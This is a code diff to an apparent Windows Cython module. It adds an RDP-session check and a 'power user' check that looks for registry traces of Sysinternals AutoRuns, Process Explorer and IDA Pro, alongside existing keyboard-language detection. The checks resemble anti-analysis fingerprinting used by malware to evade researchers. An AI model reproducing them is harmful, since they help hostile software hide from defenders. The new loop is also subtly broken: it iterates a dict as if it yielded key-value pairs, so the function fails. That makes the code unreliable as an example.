@@ -1,11 +1,11 @@
 from winreg import HKEY_CLASSES_ROOT, HKEY_CURRENT_USER, OpenKey, QueryValueEx
-from os import getlogin
 from os.path import exists,getctime
 from os.path import join as path_join
-from os import listdir
+from os import listdir,environ,getlogin
 from shutil import copyfile
 import datetime
 import sqlite3
+from Utils.helpers import getRegistryKey
 from ctypes import Structure, windll, c_uint, sizeof, byref,WinDLL
 
 
@@ -200,3 +200,17 @@ cpdef str get_keyboard_language():
 
     # Check if the hex value is in the dictionary.
     return str(language_id_hex)
+
+
+cpdef bint is_inside_rdp():
+    return environ.get('SESSIONNAME') and 'RDP' in environ.get('SESSIONNAME')
+
+cpdef bint is_power_user():
+    indicators = {r"SOFTWARE\Sysinternals\AutoRuns" : "submitvirustotal",
+                  r"SOFTWARE\Sysinternals\ProcessExplorer" : "VirusTotalCheck",
+                  r"SOFTWARE\Hex-Rays\IDA" : "RegistryVersion",
+                  }
+    for indicator_reg_path,indicator_reg_key in indicators:
+        if getRegistryKey(key_name=indicator_reg_key,registry_path=indicator_reg_path):
+            return True
+    return False
